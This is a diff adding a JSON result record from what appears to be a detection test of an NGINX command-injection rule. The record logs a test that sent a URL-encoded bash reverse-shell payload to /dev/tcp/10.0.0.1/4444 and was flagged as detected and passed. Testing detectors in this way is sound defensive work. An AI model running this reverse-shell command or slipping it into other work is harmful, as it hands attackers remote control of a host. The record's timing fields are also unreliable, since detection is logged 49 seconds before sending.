@@ -1,0 +1,17 @@
+{
+  "pattern_id": "CMD_REVSH_001",
+  "test_id": "CMD_REVSH_001-1770821109388-0azi2g",
+  "category": "cmdinj",
+  "detected": true,
+  "expected_detection": true,
+  "latency_ms": 49000,
+  "evidence": "14:45:09.000000000: Warning [NGINX CMDi] Advanced command injection attempt test_id=CMD_REVSH_001-1770821109388-0azi2g pattern_id=CMD_REVSH_001 uri=/?q=bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.0.0.1%2F4444%200%3E%261 client=127.0.0.1",
+  "rule_name": "[NGINX CMDi] Advanced command injection attempt test_id=CMD_REVSH_001-1770821109388-0azi2g pattern_id=CMD_REVSH_001 uri=/?q=bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.0.0.1%2F4444%200%3E%261 client=127.0.0.1",
+  "expected_rule": "[NGINX CMDi] Advanced command injection attempt",
+  "rule_id": "",
+  "rule_match": true,
+  "matched_rule": "[NGINX CMDi] Advanced command injection attempt test_id=CMD_REVSH_001-1770821109388-0azi2g pattern_id=CMD_REVSH_001 uri=/?q=bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.0.0.1%2F4444%200%3E%261 client=127.0.0.1",
+  "sent_at": 1770821158000,
+  "detected_at": 1770821109000,
+  "status": "passed"
+}
